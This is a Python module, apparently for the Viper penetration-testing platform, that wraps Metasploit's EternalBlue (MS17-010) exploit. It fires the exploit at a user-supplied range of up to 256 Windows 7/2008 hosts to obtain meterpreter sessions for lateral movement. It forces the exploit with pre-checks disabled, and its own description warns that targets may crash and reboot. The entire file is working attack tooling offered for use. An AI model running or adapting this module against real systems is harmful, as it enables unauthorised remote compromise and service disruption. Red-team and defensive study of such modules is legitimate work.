# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME = "MS17-010利用"
    DESC = "使用MS17-010漏洞对主机进行攻击并尝试获取Session.\n" \
           "(此操作可能会导致对方主机蓝屏重启)\n" \
           "当前只支持Win7 x64/Win2008 x64"
    MODULETYPE = TAG2CH.Lateral_Movement
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1210"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/qc0ny6"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1210/"]

    REQUIRE_SESSION = False
    OPTIONS = register_options([
        OptionIPAddressRange(name='address_range', name_tag="IP列表", desc="IP列表(支持1.1.1.1,2.2.2.2,3.3.3.3-3.3.3.10格式输入)",
                             required=True),
        # OptionBool(name='ForceExploit', name_tag="ForceExploit", desc="跳过前置检查,强制Exploit(蓝屏风险)", required=True),
        OptionHander(),

    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "exploit"
        self.mname = "windows/smb/ms17_010_eternalblue_api"

    def check(self):
        """执行前的检查函数"""

        # 设置RHOSTS参数
        address_range = self.param_address_range('address_range')
        if len(address_range) > 256:
            return False, "扫描IP范围过大(超过256),请缩小范围"
        elif len(address_range) < 0:
            self.set_msf_option(key='RHOSTS', value=self.host_ipaddress)
        self.set_msf_option('RHOSTS', ", ".join(address_range))
        self.set_msf_option('ForceExploit', True)
        self.set_msf_option('AutoCheck', False)

        payload = self.get_handler_payload()
        if "meterpreter_reverse" in payload or "meterpreter_bind" in payload:
            return False, "请选择Stageless类型的监听(例如/meterpreter/reverse_tcp或/meterpreter/bind_tcp)"
        flag = self.set_payload_by_handler()
        if flag is not True:
            return False, "Handler解析失败,请重新选择Handler参数"
        return True, None

    def callback(self, status, message, data):
        if status:
            result_format = "模块执行完成,请查看是否生成新的Session"
            self.log_good(result_format)
        else:
            self.log_error("模块执行失败")
            self.log_error(message)
